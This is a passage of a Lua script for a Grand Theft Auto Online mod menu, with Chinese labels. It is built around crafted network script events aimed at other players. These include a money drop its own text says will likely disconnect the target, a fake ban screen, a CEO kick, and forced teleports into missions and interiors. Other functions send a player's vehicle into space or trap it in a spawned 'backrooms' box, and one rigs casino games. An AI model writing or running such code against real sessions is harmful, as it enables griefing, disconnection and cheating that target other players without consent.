        menu.trigger_commands("commendfriendly".. PLAYER.GET_PLAYER_NAME(pid))
    end
end)
GTLP(friendly, '给钱和经验',{},'对方很可能会掉线.',function(f)
    for i = 0, 9 do
        for v = 0, 20 do
        util.trigger_script_event(1 << pid, {968269233, 0, i, v, v, v})
    for n = 0, 16 do
        util.trigger_script_event(1 << pid, {968269233, n, i, v, v, v})
        end
    end
    util.trigger_script_event(1 << pid, {968269233, 1, i, 1, 1, 1})
    util.trigger_script_event(1 << pid, {968269233, 3, i, 1, 1, 1})
    util.trigger_script_event(1 << pid, {968269233, 10, i, 1, 1, 1})
    util.trigger_script_event(1 << pid, {968269233, 0, i, 1, 1, 1})
    end
end)
local hugs = GT(friendly, "拥抱玩家", {"hug"}, "注意: 确保他们站着不动")
tpf_units = 1
GTAC(hugs,"拥抱1", {}, "", function()
    menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(pid))
    wait(200)
    menu.trigger_commands("nocollision" .. " on")
    menu.trigger_commands("playanimhug")
    wait(300)
    menu.trigger_commands("nocollision" .. " off")
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, tpf_units, 0)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z'], true, false, false)
end)
tpf_units = -0.7
GTAC(hugs,"拥抱2", {"hugs"}, "", function()
    menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(pid))
    wait(200)
    menu.trigger_commands("nocollision" .. " on")
    menu.trigger_commands("playanimhug2")
    wait(300)
    menu.trigger_commands("nocollision" .. " off")
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, tpf_units, 0)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z'], true, false, false)
end)
GTTG(friendly, "自动赌场赢取", {"autocasino"}, "传送该玩家到赌场,然后打开赌桌\n如果您为自己选择它,它会将您刷新到表中", function(on_toggle)
    if on_toggle then
        local player_ped = PLAYER.PLAYER_PED_ID()    
        local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
        local pld = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(pld)
        menu.trigger_commands("casinotp" .. PLAYER.GET_PLAYER_NAME(pid))
        util.trigger_script_event(1 << pid, {1268038438, 4, 123, 0, 0, 1, -1001291848, -1016910157, 1108672448, 0, -1, 0, 2147483647, 0, -1}) -- Casino Invite
        wait(1500)
        menu.trigger_commands("rigblackjack")
        menu.trigger_commands("rigroulette ".. "1")
        wait(1500)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 1132.2958, 263.93478, -51.035763)
        menu.trigger_commands("casinohelp1")
        menu.trigger_commands("casinohelp2")
    else
        menu.trigger_commands("rigblackjack")
        menu.trigger_commands("rigroulette ".. "-1")
        local player_ped = PLAYER.PLAYER_PED_ID()    
        local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
        local pld = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(pld)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, 924.2497, 46.7545, 81.0961)
    end
end)
	GTAC(friendly,"载具加速", {"boost"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 100)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)
	GTAC(friendly,"疯狂加速", {"Addictboost"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 9999999) 
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)
	GTAC(friendly,"重置速度", {"resetacc"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 1) 
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)
    GTAC(friendly,"漂移模式", {"driftmode"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_REDUCE_GRIP(vehicle, 100)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)
	GTAC(friendly,"修理载具", {"repair"}, "", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_FIXED(vehicle)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)
	GTAC(friendly,"开启载具无敌", {"invon"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)
	GTAC(friendly,"关闭载具无敌", {"invoff"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)
    GTTG(friendly,"友好的点赞", {}, "对他进行循环点赞", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("commendfriendly " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("commendhelpful " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			wait()
		end
	end)
    player_toggle_loop(friendly, pid, "给予喇叭加速", {}, "建议您在该玩家附近效果最佳\n可在聊天框提醒该玩家按喇叭", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PLAYER.IS_PLAYER_PRESSING_HORN(pid) then
            ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end)
    local tp 
    tp = player_toggle_loop(friendly, pid, "给予传送能力", {}, "让该玩家聊天框发送[传送] \n注意：玩家必须在车里!!!", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        chat.on_message(function(packet_sender, message_sender, text, team_chat)
            if string.contains(text, "传送") and PED.IS_PED_IN_VEHICLE(ped, veh, false) then  
                if players.get_name(message_sender) == players.get_name(pid) then
                    menu.trigger_commands("wptp" .. players.get_name(pid))
                end
            end
        end)
    end)
    GTLP(friendly, "循环给予纸牌", {"dropchips"}, "看起来是一个安全的选项\n但是随时都能被玩家检测", function(toggle)
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_lux_card_01a")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
    end)
    GTTG(friendly, "循环给予玩偶", {}, "看起来是一个安全的选项\n但是随时都能被玩家检测", function(on_toggle)
        local pos = players.get_position(pid)
        pos.z = pos.z + 1.5
        if on_toggle then
            wait(50)
            menu.trigger_commands("ceopay".. players.get_name(pid))
            menu.trigger_commands("rp".. players.get_name(pid))
            menu.trigger_commands("cards".. players.get_name(pid))
        else
            wait(50)
            menu.trigger_commands("ceopay".. players.get_name(pid))
            menu.trigger_commands("rp".. players.get_name(pid))
            menu.trigger_commands("cards".. players.get_name(pid))
        end
    end)
    GTAC(friendly, "给予升级", {}, "给予该玩家17万RP经验\n可快速从1级提升至25级", function()
        menu.trigger_commands("givecollectibles" .. players.get_name(pid))
    end)
GTLP(friendly, "循环掉落收集品", {}, "对您附近的玩家也有效", function()
for _, aPed in ipairs(entities.get_all_peds_as_handles()) do
    local pedType = PED.GET_PED_TYPE(aPed)
    if pedType < 4 then
        local selfCoords = players.get_position(players.user())
        local coords = ENTITY.GET_ENTITY_COORDS(aPed, true)
        local figure = MISC.GET_HASH_KEY("vw_prop_vw_colle_prbubble")
        loadModel(figure)
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z+1.5, 0, 1, figure, false, true)
        wait(partyDropDelay)
    end
end
end)
    GTLP(friendly, "给予脚本主机", {}, "", function()
        while players.get_script_host() ~= pid do 
            menu.trigger_commands("givesh" .. players.get_name(pid))
            wait(10)
        end
        wait(500)
    end)
    GTLP(friendly, "脚本主机赌博(俄罗斯轮盘)", {}, "可能会中断战局", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        menu.trigger_commands("givesh" .. players.get_name(pid))
        wait(1500)
    end
end)
    GTAC(friendly, "修理载具", {}, "修理玩家的载具\n如果玩家不在载具中\n则修理玩家驾驶过的最后一辆载具", function()    
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(player, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(playerVehicle)
        VEHICLE.SET_VEHICLE_FIXED(playerVehicle)
    end)
    GTAC(friendly, '极力保护', {'max'}, '一次性为该玩家提供:\n自动恢复/给予所有武器/永不通缉', function ()
        menu.trigger_commands("bail".. players.get_name(pid))
        menu.trigger_commands("autoheal".. players.get_name(pid))
        menu.trigger_commands("arm".. players.get_name(pid))
        menu.trigger_commands("givevehgodmode".. players.get_name(pid))
    end, nil, nil, COMMANDPERM_FRIENDLY)
    GTAC(friendly, "掉落医药包", {}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pId)
        local pos = ENTITY.GET_ENTITY_COORDS(p)
        local objHash = util.joaat("prop_ld_health_pack")
        requestModels(objHash)
        local pickupHash = 2406513688
        local pickup = OBJECT.CREATE_PICKUP(pickupHash, pos.x, pos.y + 1.0, pos.z, 1, 100, false, objHash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objHash)
    end)
    GTAC(friendly, "掉落护甲", {}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pId)
        local pos = ENTITY.GET_ENTITY_COORDS(p)
        local objHash = util.joaat("prop_armour_pickup")
        requestModels(objHash)
        local pickupHash = 1274757841
        local pickup = OBJECT.CREATE_PICKUP(pickupHash, pos.x, pos.y + 1.0, pos.z, 1, 100, false, objHash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objHash)
    end)
    GTLP(friendly, "喇叭加速", {}, "给予这个玩家喇叭加速", function()  
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
        local force = ENTITY.GET_ENTITY_FORWARD_VECTOR(vehicle)
        force.x = force.x * 20
        force.y = force.y * 20
        force.z = force.z * 20
        while PLAYER.IS_PLAYER_PRESSING_HORN(pid) == true do 
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, force.x, force.y, force.z, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
            wait(100)
        end 
    end)
    local firw = {speed = 1000}
    GTLP(friendly, '天女散花', {'firew'}, '在该玩家上方放好看滴烟花', function ()
          local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
          local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
          local weap = util.joaat('weapon_firework')
          WEAPON.REQUEST_WEAPON_ASSET(weap,0,0)
          for y = 0, 1 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(0, 15), 200, 0, weap, 0, false, false, firw.speed)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(0, 15), 200, 0, weap, 0, false, false, firw.speed)
            FIRE.ADD_EXPLOSION(tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(0, 75), 38, 1, false, false, 0, false)
            FIRE.ADD_EXPLOSION(tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(0, 75), 38, 1, false, false, 0, false) 
        end
          if not players.exists(pid) then
              util.stop_thread()
          end
      end)
    local pteleportEntities = GT(playerMain, "传送恶搞", {}, "")
    areatp = GT(pteleportEntities,"游戏类型")
    GTAC(areatp, "准备差事界面[新]", {}, "", function()
        util.trigger_script_event(1 << pid, {936332224, players.user(), pid,1}) 
        util.trigger_script_event(1 << pid, {3322638238, players.user(), pid,1,0}) 
        util.trigger_script_event(1 << pid, {259469385, players.user(), pid,0, 1}) 
        util.trigger_script_event(1 << pid, {2951660482, players.user(), pid, 1, 1, 1, 4694842, 4694842}) 
    end)
    GTAC(areatp, "虚拟封号[新]", {}, "", function()
        util.trigger_script_event(1 << pid, {-1773335296, players.user(), pid,4779250843176140801, 85015745547841, 0, 0, 0, 0}) 
    end)
    GTAC(areatp, "踢出CEO[新]", {}, "", function()
        util.trigger_script_event(1 << pid, {7311146992008020212, players.user(), pid,7290892836784832513, 28549270386769921, 0}) 
    end)
    GTAC(areatp, "公寓邀请[新]", {}, "", function()
        util.trigger_script_event(1 << pid, {-1321657966, players.user(), pid, 1, 0, -1, 1, 115, 0, 0, 0}) 
    end)
    GTAC(areatp, "传送空中别墅[新]", {}, "", function()
        util.trigger_script_event(1 << pid, {-1638522928, players.user(), pid, 1, 124, 1, 0, 1, 3297191418, 3298661873, 1085533440, 0, 0, 1, 2123789977, 1, -1}) 
    end)
    GTAC(areatp, "传送仓库[新]", {}, "", function()
        util.trigger_script_event(1 << pid, {-1253241415, players.user(), pid, 1, 0, 1, 2}) 
        util.trigger_script_event(1 << pid, {485477315, players.user(), pid, 1, 1, 0, 2604392559057}) 
    end)
    GTAC(areatp, "半履战车[任务]", {}, "", function()
        util.trigger_script_event(1 << pid, {-4035497911, players.user(), pid,1, 1}) 
    end)
    GTAC(areatp, "撤退政策[任务]", {}, "", function()
        util.trigger_script_event(1 << pid, {-4035497911, players.user(), pid,1, 2}) 
    end)
    GTAC(areatp, "离岸之财[任务]", {}, "", function()
        util.trigger_script_event(1 << pid, {-4035497911, players.user(), pid,1, 3}) 
    end)
    GTAC(areatp, "行迹败露[任务]", {}, "", function()
        util.trigger_script_event(1 << pid, {-4035497911, players.user(), pid,1, 4}) 
    end)
    GTAC(areatp, "猎杀叛徒[任务]", {}, "", function()
        util.trigger_script_event(1 << pid, {-4035497911, players.user(), pid,1, 5}) 
    end)
    GTAC(areatp, "数据泄露[任务]", {}, "", function()
        util.trigger_script_event(1 << pid, {-4035497911, players.user(), pid,1, 6}) 
    end)
    GTAC(areatp, "工作纠纷[任务]", {}, "", function()
        util.trigger_script_event(1 << pid, {-4035497911, players.user(), pid,1, 7}) 
    end)
    --
    GTAC(pteleportEntities, "传送NPC", {""}, "", function ()
        TpAllPeds(pid)
    end)
    GTAC(pteleportEntities, "传送载具", {""}, "", function ()
        TpAllVehs(pid)
    end)
    GTAC(pteleportEntities, "传送实体", {""}, "", function ()
        TpAllObjects(pid)
    end)
    GTAC(pteleportEntities, "传拾取物", {""}, "", function ()
        TpAllPickups(pid)
    end)
    GTAC(pteleportEntities, '传送玩家到目的地', {'tele'}, '将该玩家传送到他地图上设置的导航点(目的地)', function ()
       local x, y, z, b = players.get_waypoint(pid)
       if HUD.IS_WAYPOINT_ACTIVE() then
        local curway = HUD.GET_BLIP_INFO_ID_COORD(HUD.GET_FIRST_BLIP_INFO_ID(8))
        HUD.SET_WAYPOINT_OFF()
        HUD.SET_NEW_WAYPOINT(x, y)
        menu.trigger_commands("WPTP".. players.get_name(pid))
        wait(1500)
        HUD.SET_NEW_WAYPOINT(curway.x, curway.y)
        else
            HUD.SET_NEW_WAYPOINT(x, y)
            menu.trigger_commands("WPTP".. players.get_name(pid))
            HUD.SET_WAYPOINT_OFF()
       end
    end, nil, nil, COMMANDPERM_FRIENDLY)
    GTAC(pteleportEntities, "将玩家传送到花园银行", {""}, "将该玩家的车辆传送到花园银行上方", function()
        sqhy(pid)
    end)
    GTAC(pteleportEntities, "将玩家传送到高空", {""}, "", function()
        sqgk(pid)
    end)
function GetInteriorPlayerIsIn(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 245)) 
end
    local tp_player = GT(pteleportEntities, "传送玩家到...", {}, "")
    local tp_player_list = GT(tp_player, "开放地点", {}, "")
    local clubhouse = GT(tp_player, "摩托帮会所", {}, "")
    local facility = GT(tp_player, "设施", {}, "")
    local warehouse = GT(tp_player, "仓库", {}, "")
    local arcade = GT(tp_player, "游戏厅", {}, "")
    local teleports = {
        {name=("花园银行塔"),pos=v3.new(-75.261375,-818.674,326.17517)},
        {name=("乞力耶德山"),pos=v3.new(492.30,5589.44,794.28)},
        {name=("深海"),pos=v3.new(4497.2207,8028.3086,-32.635174)},
        {name=("偏远水面"),pos=v3.new(1503.0942,8746.0700,0)},
        {name=("监狱"),pos=v3.new(1737.1896,2634.897,45.56497)},
        {name=("洛圣都国际机场"),pos=v3.new(-1335.6514,-3044.2737,13.944447)},
        {name=("太空"),pos=v3.new(-191.53212,-897.53015,2600.00000)},
    }
    for i, data in teleports do
        GTAC(tp_player_list, data.name, {}, "", function()
            local vehicle = control_vehicle(pid, false, function(vehicle)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehicle, data.pos.x, data.pos.y, data.pos.z, false, false, false)
                gtoast("搞定")
            end)
            if not vehicle then
                local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local is_spectating = menu.ref_by_command_name("spectate" .. players.get_name(pid):lower()).value
                util.trigger_script_event(1 << pid, {891653640, PLAYER.PLAYER_ID(), 1, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
                util.yield(1000)
                if not is_spectating then
                    menu.trigger_commands("spectate" .. players.get_name(pid) .. " on")
                    gtoast("请稍后")
                end
                util.yield(8000)
                local mc_bike = ent_func.get_vehicle_from_ped(target_ped)
                local loop = 30
                while mc_bike == 0 and loop > 0 do
                    util.yield(100)
                    mc_bike = ent_func.get_vehicle_from_ped(target_ped)
                    loop = loop - 1
                end
                if mc_bike > 0 then
                    ent_func.get_entity_control(mc_bike)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(mc_bike, data.pos.x, data.pos.y, data.pos.z, false, false, false)
                    gtoast("搞定")
                end
                util.yield(2000)
                if not is_spectating then
                    menu.trigger_commands("spectate" .. players.get_name(pid) .. " off")
                end
            end
        end)
    end
    local wallbr = util.joaat("bkr_prop_biker_bblock_mdm3")
    local floorbr = util.joaat("bkr_prop_biker_landing_zone_01")
    GTAC(tp_player, "传送到后室(车内有效)", {}, "#后室: 外网盛传的阴间故事建筑\n#若该玩家在载具内请使用该选项\n#此功能会将玩家带入虚空后室内", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p, true)
        local defx = c.x
        local defy = c.y 
        local defz = c.z
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            STREAMING.REQUEST_MODEL(floorbr)
            while not STREAMING.HAS_MODEL_LOADED(floorbr) do
                STREAMING.REQUEST_MODEL(floorbr)
                wait()
            end
            STREAMING.REQUEST_MODEL(wallbr)
            while not STREAMING.HAS_MODEL_LOADED(wallbr) do
                STREAMING.REQUEST_MODEL(wallbr)
                wait()
            end
            RequestControl(veh)
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                wait()
            until success
            c.z = floorcoords - 100
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)
            local c = ENTITY.GET_ENTITY_COORDS(p)
            local defz = c.z
            c.z = defz - 2
            local spawnedfloorbr = entities.create_object(floorbr, c)
            c.z = c.z + 10
            local spawnedroofbr = entities.create_object(floorbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)
            defz = c.z - 5
            c.x = c.x + 4
            c.z = defz
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 8
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 8
            c.x = defx + 10.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 7.2
            c.x = defx + 3.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = defy + 6.5
            c.x = defx + 11
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = defx - 12
            c.y = defy + 4
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = defy - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 10
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = defy - 10
            c.x = defx - 19
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = defx - 3
            c.y = defy + 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = defx + 25
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x + 7
            c.y = defy
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = defy - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 7
            c.x = c.x - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y - 7
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 6.5
            c.y = c.y - 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 7.5
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT.SET_OBJECT_TINT_INDEX(spawnedwall, 7)
            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
